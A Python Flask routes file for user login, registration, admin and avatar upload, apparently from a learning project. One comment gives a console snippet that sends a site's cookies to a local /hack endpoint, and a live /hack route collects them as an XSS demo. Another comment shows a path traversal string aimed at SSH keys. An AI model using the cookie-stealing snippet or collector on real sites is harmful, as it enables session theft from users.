from utils import log
from config import  image_file_dir, qiniu_up, gg
from routes import (
    current_user,
    login_required,
)

from flask import (
    request,
    Blueprint,
    render_template,
    redirect,
    url_for,
    session,
    make_response,
    send_from_directory,
)
from werkzeug.utils import secure_filename
import os
from models.user import User
from models.board import Board


main = Blueprint('user', __name__)


@main.route('/', methods=['GET'])
def index():
    """
    主页的处理函数，如果登录，显示username，不然则显示游客
    :return: 主页
    """
    body = render_template('user/index.html', username='游客')
    user = current_user()
    log('routes_index ----> check current_user 返回值的type: ', user)
    if user is not None:
        body = render_template('user/index.html', username=user.username)
    r = make_response(body)
    return r


@main.route('/test_login', methods=['POST', 'GET'])
def test_login():
    """
    允许GET是因为在index页面转到login页面需要
    POST是因为在login页面输入账号密码点击login按钮需要
    主要的bug是在index和login页面都都是同一个路由函数
    :return:无论如何都会显示login页面
    """
    form = request.form
    log('from route_login --> cookies: ', request.cookies)
    u = current_user()
    # ImmutableMultiDict([])是什么鬼？
    if form.get('username', None):
        if User.validate_login(form):
            u = User.find_by(username=form.get('username'))
            session['user_id'] = u.id
            result = '登录成功'
        else:
            result = '用户名或者密码错误'
    else:
        result = '请再登陆'
    body = render_template('user/login.html', result=result, username='游客')
    if u is not None:
        body = body.replace('游客', u.username)
        body = body.replace('请再登陆', '')
    return make_response(body)


@main.route('/out')
def out():
    """
    在session中删除当前登录的user_id
    :return: 返回login页面
    """
    session.pop('user_id')
    return redirect(url_for('.test_login'))


@main.route('/test_register', methods=['POST', 'GET'])
def test_register():
    """
    允许GET是因为在地址栏输入地址转到register页面需要
    POST是因为在register页面输入账号密码点击register按钮需要
    主要的bug是转到register页面和register页面都都是同一个路由函数
    :return: 返回register页面，并显示所有用户信息
    """
    result = ''
    form = request.form
    if request.method == 'POST':
        if User.validate_register(form):
            # html元素失效
            result = '注册成功'
        else:
            result = '用户名或者密码长度必须大于2或者用户名已注册'
    body = render_template('user/register.html', result=result, users=User.find_all(deleted=False))
    return make_response(body)


@main.route('/profile', methods=['GET'])
@login_required
def profile():
    """
    显示已登录用户的信息，木有模板
    :return: 返回含有已登录用户的信息
    """
    u = current_user()
    # html元素有效有效有效有效有效有效有效有效有效有效有效
    # 似乎render_template函数里面参数赋值的时候有过滤？
    # 在render_template中直接文本替代是不行的，只会当成字符串
    body = render_template('user/profile.html', u=u)
    return make_response(body)


# ==============================
# 以上测试用，可以作废
# ==============================


@main.route('/admin/users', methods=['GET'])
@login_required
def admin():
    """
    只有用户id为1的用户有权限
    :return: 返回所有用户的信息
    """
    User.check_admin()
    body = render_template('user/admin.html', users=User.find_all(deleted=False), boards=Board.find_all(deleted=False))
    return make_response(body)


@main.route('/admin/user/update', methods=['POST'])
@login_required
def admin_update():
    """
    只有用户id为1的用户有权限，输入需要修改的id和password
    :return: 返回修改过的所有用户的信息
    """
    User.check_admin()
    form = request.form
    newUser = User.update(form)
    return redirect(url_for('.admin'))


@main.route('/admin/user/delete/<int:user_id>')
@login_required
def user_delete(user_id):
    User.check_admin()
    User.remove(user_id)
    return redirect(url_for('.admin'))


# 图片格式安全过滤
def allow_file(filename):
    suffix = filename.split('.')[-1]
    from config import accept_image_file_type
    return suffix in accept_image_file_type


# 所有用户上传头像,先存在本地得到路径之后上传至七牛云，并删除本地图片
@main.route('/add_image', methods=['POST'])
@login_required
def add_img():
    u = current_user()
    token = request.args.get('token')
    if User.check_token(token, gg.csrf_tokens):
        file = request.files['avatar']
        if allow_file(file.filename):
            # 上传的文件一定要用 secure_filename 函数过滤一下名字
            # ../../../../../../../root/.ssh/authorized_keys
            filename = secure_filename(file.filename)
            # 2018/3/19/yiasduifhy289389f.png
            file.save(os.path.join(image_file_dir, filename))
            # u.add_avatar(filename)
            domain = qiniu_up(filename)
            os.remove(os.path.join(image_file_dir, filename))
            u.user_image = domain + filename
            u.save()
        return redirect(url_for('.user_setting', id=u.id, token=token))


# web后端上传头像，后续可以改成Nginx+图床
# 本地只有default.png一张图片
@main.route('/uploads/<filename>')
@login_required
def uploads(filename):
    return send_from_directory(image_file_dir, filename)


# 在知乎console输入
# var c = document.cookie
# var img = `<img src='http://localhost:4000/hack?cookie=${c}'>`
# document.body.innerHTML += img
@main.route('/hack')
def hack():
    # xss 攻击的后台
    cookie = request.args.get('cookie')
    print('cookie', cookie)


# 增加一个可以看到任意user的路由函数
# 不需要check token，CRUD中除了查不需要验证token，但是需要传递token
# 需要传递   u: 我想要看的用户    和    user: current_user()
@main.route('/user/<int:id>')
# @login_required
def user_detail(id):
    user = current_user()
    u = User.find(id)
    token = request.args.get('token')
    if user is not None:
        return render_template('user/profile.html', u=u, user=user, token=token, bid=-1)
    else:
        return render_template('user/profile.html', u=u, user=user)


# update方法需要重新写，统一到model父类中
# 增加一个在setting页面update的路由函数
@main.route('/user/update', methods=['POST'])
@login_required
def user_update():
    user = current_user()
    token = request.args.get('token')
    if User.check_token(token, gg.csrf_tokens):
        form = request.form
        newUser = User.update(form)
        return redirect(url_for('user.user_setting', id=user.id, token=token))


# 增加一个在setting页面update密码的路由函数
@main.route('/user/update_password', methods=['POST'])
@login_required
def user_update_password():
    user = current_user()
    token = request.args.get('token')
    if User.check_token(token, gg.csrf_tokens):
        form = request.form
        if user.password == User.salted_password(form.get('old_password')):
            newUser = User.update_pass(form)
            return redirect(url_for('user.user_setting', id=user.id, token=token))


# 增加一个去setting页面的路由函数
@main.route('/setting')
@login_required
def user_setting():
    user = current_user()
    token = request.args.get('token')
    if User.check_token(token, gg.csrf_tokens):
        return render_template('user/setting.html', user=user, token=token, bid=-1)


# 增加一个去login页面的路由函数
@main.route('/login', methods=['GET'])
def user_login():
    user = current_user()
    return render_template('user/new_login.html', u=user)


# 增加一个signin的路由函数
@main.route('/signin', methods=['POST'])
def user_signin():
    form = request.form
    log('from route_login --> cookies: ', request.cookies)
    # ImmutableMultiDict([])是什么鬼？
    if form.get('username', None):
        if User.validate_login(form):
            u = User.find_by(username=form.get('username'))
            session['user_id'] = u.id
            return redirect(url_for('tweet.index'))


# 增加一个去register页面的路由函数
@main.route('/register_page', methods=['GET'])
def user_reg():
    user = current_user()
    return render_template('user/new_register.html', u=user)


# 增加一个register的路由函数
@main.route('/register', methods=['POST'])
def user_register():
    """
    允许GET是因为在地址栏输入地址转到register页面需要
    POST是因为在register页面输入账号密码点击register按钮需要
    主要的bug是转到register页面和register页面都都是同一个路由函数
    :return: 返回register页面，并显示所有用户信息
    """
    form = request.form
    if User.validate_register(form):
        return redirect(url_for('user.user_login'))


@main.route('/signout')
def user_signout():
    """
    在session中删除当前登录的user_id
    :return: 返回login页面
    """
    session.pop('user_id')
    return redirect(url_for('tweet.index'))
